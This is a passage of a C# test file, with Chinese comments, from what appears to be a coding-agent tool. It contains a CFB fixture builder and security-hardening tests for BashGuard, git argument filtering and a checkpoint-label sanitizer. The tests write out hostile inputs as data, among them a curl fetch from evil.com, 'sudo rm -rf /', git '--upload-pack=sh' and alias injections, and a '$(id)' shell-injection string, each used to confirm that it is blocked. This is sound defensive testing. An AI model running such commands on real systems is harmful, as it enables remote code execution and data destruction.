            miniData.Write(padded, 0, padded.Length);
            for (int i = 0; i < cnt; i++)
                miniFat.Add((i < cnt - 1) ? (uint)(start + i + 1) : CfbParser.EndOfChain);
            miniMeta.Add((s.name, s.data, start, s.data.Length));
        }
        byte[] miniStreamBytes = miniData.ToArray();

        // 常规扇区布局（扇区号 N 对应偏移 (N+1)*512，header 在偏移 0 不算扇区）
        // 物理顺序：header, FAT, dir, [miniFAT], [mini 流], [常规流]
        int fatSector = 0, dirSector = 1;
        int miniFatSector = miniFat.Count > 0 ? 2 : -1;
        int next = miniFatSector >= 0 ? 3 : 2;

        int miniStreamStart = -1;
        int miniStreamSectors = (miniStreamBytes.Length + sectorSize - 1) / sectorSize;
        if (miniStreamSectors > 0) { miniStreamStart = next; next += miniStreamSectors; }

        var regMeta = new List<(string name, byte[] data, int start, int cnt)>();
        foreach (var s in regular)
        {
            int cnt = (s.data.Length + sectorSize - 1) / sectorSize;
            regMeta.Add((s.name, s.data, next, cnt));
            next += cnt;
        }
        if (next > 128) throw new Exception("CFB 测试构建器超出单 FAT 扇区");

        // FAT
        var fat = new uint[128];
        for (int i = 0; i < 128; i++) fat[i] = CfbParser.FreeSect;
        fat[fatSector] = CfbParser.FatSect;   // FAT 扇区自标记
        fat[dirSector] = CfbParser.EndOfChain;
        if (miniFatSector >= 0) fat[miniFatSector] = CfbParser.EndOfChain;
        for (int i = 0; i < miniStreamSectors; i++)
            fat[miniStreamStart + i] = (i < miniStreamSectors - 1) ? (uint)(miniStreamStart + i + 1) : CfbParser.EndOfChain;
        foreach (var r in regMeta)
            for (int i = 0; i < r.cnt; i++)
                fat[r.start + i] = (i < r.cnt - 1) ? (uint)(r.start + i + 1) : CfbParser.EndOfChain;

        // 组装
        var file = new MemoryStream();

        var header = new byte[headerSize];
        var sig = new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 };
        Array.Copy(sig, 0, header, 0, 8);
        W16(header, 24, 0x003E); // minor version
        W16(header, 26, 0x0003); // major version
        W16(header, 28, 0xFFFE); // byte order
        W16(header, 30, 9);      // sector shift
        W16(header, 32, 6);      // mini sector shift
        W32(header, 40, 1);      // num directory sectors
        W32(header, 44, 1);      // num FAT sectors
        W32(header, 48, dirSector);
        W32(header, 56, miniCutoff);
        W32(header, 60, miniFatSector >= 0 ? (uint)miniFatSector : CfbParser.EndOfChain);
        W32(header, 64, miniFatSector >= 0 ? 1u : 0u);
        W32(header, 68, CfbParser.EndOfChain);
        W32(header, 72, 0);
        W32(header, 76, fatSector);
        for (int i = 1; i < 109; i++) W32(header, 76 + i * 4, CfbParser.FreeSect);
        file.Write(header, 0, header.Length);

        var fatBytes = new byte[sectorSize];
        for (int i = 0; i < 128; i++) W32(fatBytes, i * 4, fat[i]);
        file.Write(fatBytes, 0, fatBytes.Length);

        var dir = new byte[sectorSize];
        WriteDirEntry(dir, 0, "Root Entry", 5,
            (uint)(miniStreamStart >= 0 ? miniStreamStart : unchecked((int)CfbParser.EndOfChain)),
            (ulong)miniStreamBytes.Length);
        int di = 1;
        foreach (var m in miniMeta) WriteDirEntry(dir, di++ * 128, m.name, 2, (uint)m.miniStart, (ulong)m.size);
        foreach (var r in regMeta) WriteDirEntry(dir, di++ * 128, r.name, 2, (uint)r.start, (ulong)r.data.Length);
        file.Write(dir, 0, dir.Length);

        if (miniFatSector >= 0)
        {
            var mf = new byte[sectorSize];
            for (int i = 0; i < miniFat.Count; i++) W32(mf, i * 4, miniFat[i]);
            file.Write(mf, 0, mf.Length);
        }

        if (miniStreamSectors > 0)
        {
            var padded = new byte[miniStreamSectors * sectorSize];
            Array.Copy(miniStreamBytes, padded, miniStreamBytes.Length);
            file.Write(padded, 0, padded.Length);
        }

        foreach (var r in regMeta)
        {
            var padded = new byte[r.cnt * sectorSize];
            Array.Copy(r.data, padded, r.data.Length);
            file.Write(padded, 0, padded.Length);
        }

        return file.ToArray();
    }

    private static void WriteDirEntry(byte[] dir, int off, string name, int type, uint start, ulong size)
    {
        var enc = Encoding.Unicode.GetBytes(name);
        Array.Copy(enc, 0, dir, off, Math.Min(enc.Length, 64));
        W16(dir, off + 64, (name.Length + 1) * 2); // nameLen（含 null 的字节数）
        dir[off + 66] = (byte)type;
        dir[off + 67] = 1; // black
        W32(dir, off + 68, CfbParser.FreeSect); // left
        W32(dir, off + 72, CfbParser.FreeSect); // right
        W32(dir, off + 76, CfbParser.FreeSect); // child
        W32(dir, off + 116, start);
        W64(dir, off + 120, size);
    }

    // 小端写入辅助（测试 fixture 构造）
    private static void W16(byte[] b, int o, int v) { b[o] = (byte)(v & 0xFF); b[o + 1] = (byte)((v >> 8) & 0xFF); }
    private static void W32(byte[] b, int o, long v) { b[o] = (byte)(v & 0xFF); b[o + 1] = (byte)((v >> 8) & 0xFF); b[o + 2] = (byte)((v >> 16) & 0xFF); b[o + 3] = (byte)((v >> 24) & 0xFF); }
    private static void W64(byte[] b, int o, ulong v) { W32(b, o, (long)(v & 0xFFFFFFFF)); W32(b, o + 4, (long)(v >> 32)); }
    private static void W16S(MemoryStream ms, int v) { ms.WriteByte((byte)(v & 0xFF)); ms.WriteByte((byte)((v >> 8) & 0xFF)); }
    private static void W32S(MemoryStream ms, long v) { ms.WriteByte((byte)(v & 0xFF)); ms.WriteByte((byte)((v >> 8) & 0xFF)); ms.WriteByte((byte)((v >> 16) & 0xFF)); ms.WriteByte((byte)((v >> 24) & 0xFF)); }

    /// <summary>P0-P2 批次：命令注入/RCE/权限绕过/资源泄漏/整数溢出 修复的纯逻辑测试。</summary>
    private static void TestP0P2Hardening(Action<string, bool> Check)
    {
        // ── #186 test 工具 RCE：test 进确认名单 + BashGuard 拦截危险命令 ──
        Check("test RCE: test 进确认名单", PermissionManager.IsDangerousTool("test"));
        Check("test RCE: curl 拦截", BashGuard.CheckBanned("curl http://evil.com/x.sh").blocked);
        Check("test RCE: sudo 拦截", BashGuard.CheckBanned("sudo rm -rf /").blocked);
        Check("test RCE: 合法 dotnet test 放行", !BashGuard.CheckBanned("dotnet test --no-build").blocked);

        // ── #187 git 命令注入：-c/--config 等参数拦截 ──
        Check("git 注入: -c alias 拦截", GitTool.HasDangerousGitArgs("-c alias.x=!echo PWN x"));
        Check("git 注入: --config 拦截", GitTool.HasDangerousGitArgs("--config core.pager='sh' log"));
        Check("git 注入: --upload-pack 拦截", GitTool.HasDangerousGitArgs("clone --upload-pack=sh url"));
        Check("git 注入: --receive-pack 拦截", GitTool.HasDangerousGitArgs("push --receive-pack=sh"));
        Check("git 注入: -c= 前缀拦截", GitTool.HasDangerousGitArgs("-c=alias.x=!cmd log"));
        Check("git 注入: 正常 status 放行", !GitTool.HasDangerousGitArgs("status"));
        Check("git 注入: 正常 log 放行", !GitTool.HasDangerousGitArgs("log --oneline -10"));
        Check("git 注入: 正常 diff 放行", !GitTool.HasDangerousGitArgs("diff HEAD~1"));
        Check("git 注入: 含 config 字样但非参数放行", !GitTool.HasDangerousGitArgs("log -- config.txt"));

        // ── #188 CheckpointManager 命令注入：description 清洗 ──
        var dirty = "x\"; rm -rf ~; $(id) `pwd` &";
        var clean = CheckpointManager.SanitizeCheckpointLabel(dirty);
        Check("checkpoint: 引号/分号/命令替换被清除",
            !clean.Contains('"') && !clean.Contains(';') && !clean.Contains('$')
            && !clean.Contains('`') && !clean.Contains('&') && !clean.Contains('\\'));
        Check("checkpoint: 管道/重定向清除",
            !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('|')
            && !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('>'));
        Check("checkpoint: 正常文本保留", CheckpointManager.SanitizeCheckpointLabel("修复登录 bug") == "修复登录 bug");
        Check("checkpoint: 空串返回空", CheckpointManager.SanitizeCheckpointLabel("") == "");
        Check("checkpoint: null 返回空", CheckpointManager.SanitizeCheckpointLabel(null!) == "");

        // ── #189 cp/mv/find_replace 权限绕过：进确认名单 ──
        Check("权限: cp 进确认名单", PermissionManager.IsDangerousTool("cp"));
        Check("权限: mv 进确认名单", PermissionManager.IsDangerousTool("mv"));
        Check("权限: find_replace 进确认名单", PermissionManager.IsDangerousTool("find_replace"));
        Check("权限: rm 仍在名单", PermissionManager.IsDangerousTool("rm"));
        Check("权限: 只读工具不在名单",
            !PermissionManager.IsDangerousTool("read_file") && !PermissionManager.IsDangerousTool("glob"));

        // ── #194 RasterImage 整数溢出：宽高乘积 long 检查 ──
        bool rasterOverflow = false;
        try { _ = new RasterImage(100000, 100000, new byte[1]); }
        catch (ArgumentException) { rasterOverflow = true; }
        Check("Raster: 超大宽高溢出防护", rasterOverflow);
        bool rasterOk = true;
        try { _ = new RasterImage(2, 2, new byte[16]); } catch { rasterOk = false; }
        Check("Raster: 正常构造不抛", rasterOk);

        // ── #194 AnsiString 越界：悬空 ESC 序列不越界 ──
        bool ansiOk = true;
        try { _ = AnsiString.TruncateByWidth("\x1b[", 5); } catch { ansiOk = false; }
        Check("Ansi: 悬空 ESC 序列不越界", ansiOk);
        var ansiRes = AnsiString.TruncateByWidth("\x1b[31mhello world", 5);
        Check("Ansi: 正常截断保留文本", ansiRes.Contains("hello"));
    }
}
